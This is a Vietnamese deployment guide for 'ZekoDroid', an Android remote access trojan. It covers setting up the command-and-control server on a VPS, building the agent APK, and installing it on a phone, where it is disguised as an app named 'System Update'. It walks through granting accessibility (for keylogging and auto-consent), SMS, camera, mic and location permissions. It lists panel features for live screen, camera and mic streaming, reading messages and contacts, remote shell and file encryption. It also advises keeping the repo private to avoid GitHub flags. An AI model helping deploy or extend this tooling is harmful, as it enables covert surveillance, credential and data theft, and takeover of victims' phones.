# DEPLOY — A → Z

Toàn bộ hệ thống gồm 3 phần:

| Phần | Chạy ở đâu | Build bằng |
|---|---|---|
| C2 server + panel | VPS Linux | `bootstrap.sh` (tự cài .NET 9 + systemd) |
| APK agent | điện thoại Android | panel **Builder** (server tự ký) hoặc `build.ps1` |
| Base APK | repo | `ZekoDroid.apk` (56 KB) |

---

## 0. Chuẩn bị

- VPS Ubuntu 22.04/24.04 (1 GB RAM đủ), mở port `8080` + `7878`.
- Điện thoại Android 7+ (minSdk 24).
- (tuỳ chọn) máy Windows có .NET 9 SDK + Android build-tools nếu muốn build APK từ source.

---

## 1. VPS — 1 khối lệnh

```bash
sudo apt-get update && sudo apt-get install -y git \
&& sudo git clone https://github.com/IzumKonata-Thaoo/zekodroid.git /opt/zekodroid-src \
&& cd /opt/zekodroid-src && sudo bash bootstrap.sh
```

Xong nó in ra:

```
dashboard : http://IP:8080
agent tcp : IP:7878
user      : admin
pass      : xxxxxxxxxxxx
PSK       : yyyyyyyyyyyyyyyyyyyyyyyy
```

Mở `http://IP:8080` → đăng nhập.

Repo **public** — clone không cần token:

```bash
sudo git clone https://github.com/IzumKonata-Thaoo/zekodroid.git /opt/zekodroid-src
```

---

## 2. Build APK ngay trên panel

1. Đăng nhập panel → nút **🐋 Builder**.
2. `host` = IP VPS, `port` = 7878, `psk` = PSK ở bước 1 (dán vào), icon tuỳ chọn.
3. **Build & tải APK** → `ZekoDroid-<ip>.apk` (~50 KB).
4. `adb install -r ZekoDroid-<ip>.apk` (hoặc copy file sang máy, bật "cài từ nguồn khác").

Build lại mất ~40 ms, không cần Android SDK trên VPS.

---

## 3. Cấu hình trên điện thoại (1 lần)

Mở app **System Update**:

| Bước | Nút | Việc |
|---|---|---|
| 1 | **Cấp quyền** | cho hết hộp thoại (camera, mic, SMS, danh bạ, vị trí, file) |
| 2 | **Bật chia sẻ màn hình** | đồng ý MediaProjection (chỉ cần cho tab Màn hình) |
| 3 | **Mở cài đặt pin** | chọn *Không tối ưu hoá* để service không bị kill |
| 3b | **Bật trợ năng** | bật `System Update` → có keylog + tap/swipe + tự bấm consent |
| 3c | **Cho phép đọc thông báo** | bật trong Notification access |
| 4 | **Khởi động dịch vụ** | app kết nối về VPS |

Thiết bị hiện trong panel sau vài giây.

---

## 4. Dùng panel

| Tab | Làm gì |
|---|---|
| **Info** | model/hãng/Android/pin/SIM/IP, Inspector (cây accessibility), Quyền |
| **Live** | nghe mic realtime, GPS realtime, clipboard realtime, feed event |
| **Màn hình** | stream + **bấm vào ảnh = tap**, kéo = swipe (cần bật trợ năng) |
| **Camera** | stream trước/sau, đổi fps/quality |
| **SMS / Danh bạ / Call log / Thông báo** | đọc dữ liệu máy |
| **Vị trí** | toạ độ + link Google Maps |
| **Files** | duyệt, tải, upload, mã hoá AES |
| **Shell** | chạy lệnh shell trên máy |
| **Apps** | danh sách app đã cài |
| **Mic** | ghi âm N giây, phát lại trong panel |
| **⚙ Quản trị** | Users (tạo/xoá), Sessions (thu hồi), Logs |

---

## 5. Quản trị

```bash
systemctl status zekodroid        # trạng thái
journalctl -u zekodroid -f        # log realtime
cat /etc/zekodroid.env            # user/pass/PSK/port
systemctl restart zekodroid       # restart sau khi đổi env
```

Đổi port / mật khẩu: sửa `/etc/zekodroid.env` → `systemctl restart zekodroid`.

Tạo thêm user: panel **⚙ Quản trị → Users** (role `admin` / `operator` / `viewer`).

Lưu ý: tài khoản admin đầu tiên chỉ tạo 1 lần khi bảng `users` rỗng
(lấy từ `ZK_USER`/`ZK_PASS`). Muốn reset: `rm /opt/zekodroid/zekorat.db` rồi restart.

---

## 6. Cập nhật phiên bản mới

```bash
cd /opt/zekodroid-src && sudo git pull && sudo bash bootstrap.sh
```

Script giữ nguyên `/etc/zekodroid.env` và `zekorat.db` — chỉ build lại + restart.

---

## 7. Build APK từ source (tuỳ chọn, trên Windows)

Cần: .NET 9 SDK, JDK 21 (JBR của Android Studio), Android SDK build-tools 36 + platform 36.

```powershell
cd zekodroid
.\build.ps1                  # -> ZekoDroid.apk
adb install -r ZekoDroid.apk
```

Sửa `config.properties` (`ZK_HOST`, `ZK_PORT`, `ZK_PSK`) rồi build lại nếu muốn
config khác — nhưng bình thường chỉ cần dùng **Builder** trên panel.

---

## 8. Bảo mật — đọc trước khi dùng thật

- Repo này chứa RAT. Để **private**, không public (vi phạm ToS GitHub và bị flag).
- Chỉ cài lên máy mày sở hữu hoặc có uỷ quyền bằng văn bản.
- Panel đang chạy HTTP. Nếu dùng ngoài LAN: đặt sau nginx/Caddy có TLS,
  hoặc giới hạn `8080` theo IP nhà (`ufw allow from IP_NHA to any port 8080`).
- Bật `ZK_PSK` (script đã sinh sẵn) để traffic agent ↔ server được mã hoá AES-256-GCM.
- `server/builder/zeko.pfx` là khoá ký APK — **không commit**, tự sinh lại ở mỗi máy.
- Cổng `7878` nên giới hạn IP nếu biết dải mạng di động hay dùng.

---

## 9. Sự cố thường gặp

| Lỗi | Nguyên nhân | Fix |
|---|---|---|
| `System.DllNotFoundException: e_sqlite3` | bản cũ publish `PublishSingleFile` thiếu native lib | `cd /opt/zekodroid-src && sudo git pull && sudo bash bootstrap.sh` (bản mới publish dạng folder, có `libe_sqlite3.so`) |
| `service khong chay` | xem `journalctl -u zekodroid -n 50` | |
| Panel mở nhưng 502/timeout | ufw chặn 8080 | `sudo ufw allow 8080/tcp` |
| Agent không kết nối | sai host/port/PSK trong APK, hoặc 7878 bị chặn | build lại APK từ panel với đúng IP + PSK |
| Quên mật khẩu admin | `users` rỗng → tạo lại từ env | `sudo rm /opt/zekodroid/zekorat.db && sudo systemctl restart zekodroid` (mất dữ liệu) |